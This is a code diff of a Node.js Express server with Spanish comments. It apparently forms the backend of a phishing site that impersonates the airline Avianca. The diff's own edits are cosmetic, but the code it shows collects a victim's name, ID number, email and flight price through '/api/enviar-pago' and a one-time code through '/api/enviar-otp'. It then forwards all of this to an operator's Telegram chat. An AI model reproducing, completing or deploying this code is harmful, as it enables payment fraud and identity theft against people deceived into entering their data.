@@ -6,7 +6,7 @@ const cors = require('cors');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Configuración de variables de entorno para mayor seguridad
+// Obtener los secretos de las variables de entorno de forma segura
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -15,17 +15,14 @@ if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
     process.exit(1);
 }
 
-// Middleware para habilitar CORS, servir archivos estáticos y procesar JSON
-app.use(cors());
+// Middleware para servir archivos estáticos desde la carpeta 'public'
 app.use(express.static(path.join(__dirname, 'public')));
+// Middleware para procesar JSON en las peticiones
 app.use(express.json());
+// Middleware para habilitar CORS (aunque ya no es estrictamente necesario, es una buena práctica)
+app.use(cors());
 
-// Ruta principal para servir index.html
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Función de ayuda para escapar caracteres de Markdown
+// Función para escapar caracteres de Markdown
 function escapeMarkdownV2(text) {
     if (!text) return '';
     const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
@@ -48,7 +45,7 @@ app.post('/api/enviar-pago', async (req, res) => {
 *💰 Precio:* $${escapeMarkdownV2(paymentData.flightCost)} USD
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *👤 DATOS DEL TITULAR*
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *🤵‍♂️ Nombre:* ${escapeMarkdownV2(paymentData.name)}
 *🪪 Identificación:* ${escapeMarkdownV2(paymentData.cc)}
 *📧 Email:* ${escapeMarkdownV2(paymentData.email)}
@@ -101,9 +98,9 @@ app.post('/api/enviar-otp', async (req, res) => {
 
     const fullMessage = `
 ✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *👤 DATOS DEL TITULAR*
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *🤵‍♂️ Nombre:* ${escapeMarkdownV2(storedData.name)}
 *🪪 Identificación:* ${escapeMarkdownV2(storedData.cc)}
 *📧 Email:* ${escapeMarkdownV2(storedData.email)}
